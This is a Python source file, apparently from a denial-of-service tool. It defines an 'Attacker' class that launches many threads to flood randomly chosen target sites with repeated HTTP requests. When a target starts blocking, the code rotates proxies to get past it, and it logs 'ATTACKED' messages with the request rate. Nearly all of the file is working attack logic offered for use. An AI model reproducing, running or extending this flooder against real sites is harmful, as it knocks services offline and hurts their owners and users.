from gc import collect
from threading import Thread, Event
from time import sleep, time
from random import choice
from typing import Optional

from attacker.scraper import Scraper
from config import MAX_REQUESTS
from logger import get_logger
from utils import clear_console

log = get_logger()


class Attacker:
    success_response_count: Optional[int] = None
    start_time: Optional[time] = None
    stop_event: Optional[Event] = None

    def __init__(self):
        self.sites_for_attack: Optional[list[str]] = None
        self.__workers: Optional[list[Thread]] = None

    def site_attack(self, site_url: str, scraper: Scraper):
        self.success_response_count += 1
        for _ in range(MAX_REQUESTS):
            response = scraper.send_request_to_site(site_url)
            self.success_response_count += 1
            message = f"ATTACKED {site_url}; " \
                      f"RESPONSE CODE: {response.status_code}; " \
                      f"SPEED: {self.get_speed_send_request()} requests/s;"
            log.success(message) if response.status_code < 303 else log.info(message)
            response.close()
            if self.stop_event.is_set():
                break

    def get_speed_send_request(self) -> int:
        return int(self.success_response_count / (time() - self.start_time))

    def get_random_site(self) -> str:
        return choice(self.sites_for_attack)

    def _worker(self):
        while not self.stop_event.is_set():
            scraper = Scraper()
            scraper.update_headers()
            site = self.get_random_site()
            log.info(f"STARTING ATTACK TO {site}")
            try:
                response = scraper.send_request_to_site(site)
                if response.status_code > 303:
                    while True:
                        try:
                            scraper.update_proxies()
                        except StopIteration:
                            break
                        response = scraper.send_request_to_site(site)
                        if response.status_code in range(200, 302):
                            self.site_attack(site, scraper)
                else:
                    self.site_attack(site, scraper)
            except Exception as ex:
                log.error(f"{site}: {ex}")
            sleep(.005)

    def start_workers(self, threads_count: int):
        self.stop_event = Event()
        self.start_time = time()
        self.success_response_count = 0

        self.__workers = [Thread(target=self._worker) for _ in range(threads_count)]
        for worker in self.__workers:
            worker.start()

    def stop_workers(self):
        self.stop_event.set()
        for worker in self.__workers:
            worker.join(timeout=0.01)
        self.__workers.clear()
        collect()
        clear_console()
